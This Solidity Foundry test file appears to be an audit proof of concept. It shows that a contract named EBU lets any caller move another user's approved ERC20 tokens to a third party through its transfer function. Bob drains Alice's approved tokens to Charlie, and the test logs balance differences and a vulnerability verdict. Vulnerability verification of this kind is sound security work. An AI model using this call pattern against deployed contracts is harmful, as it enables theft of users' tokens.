// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol";

contract MockERC20 {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowances[from][msg.sender] >= amount, "Insufficient allowance");
        require(balances[from] >= amount, "Insufficient balance");
        
        allowances[from][msg.sender] -= amount;
        balances[from] -= amount;
        balances[to] += amount;
        return true;
    }
    
    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
}

contract EBU_UnauthorizedTransfer_Test is Test {
    EBU public ebu;
    MockERC20 public token;
    
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy EBU and token contracts
        ebu = new EBU();
        token = new MockERC20();
        
        // Authorize token in EBU system
        ebu.authorizeToken(address(token));
        
        // Mint tokens to Alice
        token.mint(alice, 1000 ether);
        
        vm.stopPrank();
    }
    
    function test_UnauthorizedTransfer_WithoutApproval() public {
        uint256 transferAmount = 500 ether;
        
        // Calculate receiver arrays
        address[] memory toArray = new address[](1);
        toArray[0] = charlie;
        
        uint256[] memory amountArray = new uint256[](1);
        amountArray[0] = transferAmount;
        
        // Bob transfers Alice's tokens without approval
        vm.prank(bob);
        ebu.transfer(alice, address(token), toArray, amountArray);
        
        // Verify tokens were transferred
        assertEq(token.balanceOf(alice), 1000 ether, "Alice's balance should be unaffected (transfer should have failed)");
        assertEq(token.balanceOf(charlie), 0, "Charlie should not have received tokens");
    }
    
    function test_UnauthorizedTransfer_WithApproval() public {
        uint256 transferAmount = 500 ether;
        
        // Alice approves EBU contract to spend her tokens
        vm.prank(alice);
        token.approve(address(ebu), 500 ether);
        
        // Calculate receiver arrays
        address[] memory toArray = new address[](1);
        toArray[0] = charlie;
        
        uint256[] memory amountArray = new uint256[](1);
        amountArray[0] = transferAmount;

        /* ---------- DIFFERENTIAL VALIDATION ADDED HERE ---------- */
        console.log("--- BEFORE-Trigger Transfer ---");
        // Record pre-transfer token balances
        uint256 aliceBalanceBefore = token.balanceOf(alice);
        uint256 charlieBalanceBefore = token.balanceOf(charlie);
        console.log("Alice balance before transfer:", aliceBalanceBefore);
        console.log("Charlie balance before transfer:", charlieBalanceBefore);
        
        console.log("--- Trigger Unauthorized Transfer ---");
        // Execute transfer with unauthorized user
        vm.prank(bob);
        (bool transferSuccess,) = address(ebu).call(
            abi.encodeWithSelector(
                ebu.transfer.selector,
                alice,
                address(token),
                toArray,
                amountArray
            )
        );
        console.log("Transfer operation result:", transferSuccess);
        
        console.log("--- AFTER-Trigger Transfer ---");
        // Record post-transfer token balances
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 charlieBalanceAfter = token.balanceOf(charlie);
        console.log("Alice balance after transfer:", aliceBalanceAfter);
        console.log("Charlie balance after transfer:", charlieBalanceAfter);
        
        // Compute balance differences
        int256 aliceBalanceDiff = int256(aliceBalanceAfter) - int256(aliceBalanceBefore);
        int256 charlieBalanceDiff = int256(charlieBalanceAfter) - int256(charlieBalanceBefore);
        console.log("Alice balance difference:", aliceBalanceDiff);
        console.log("Charlie balance difference:", charlieBalanceDiff);
        
        // Validate vulnerability exposure
        bool balanceChangesMatch = 
            aliceBalanceDiff == -int256(transferAmount) && 
            charlieBalanceDiff == int256(transferAmount);
        
        // Final vulnerability verdict
        if (transferSuccess && balanceChangesMatch) {
            console.log("Vulnerability Exists: Unauthorized transfer succeeded - attacker manipulated token balances");
        } else {
            console.log("Vulnerability not Exist: Transfer failed or balance changes incorrect");
        }
        /* ---------- END OF DIFFERENTIAL VALIDATION ---------- */
        
        // Also leave the original assertions
        assertEq(token.balanceOf(alice), 500 ether, "Alice lost tokens via unauthorized transfer");
        assertEq(token.balanceOf(charlie), 500 ether, "Charlie received tokens via unauthorized transfer");
    }
}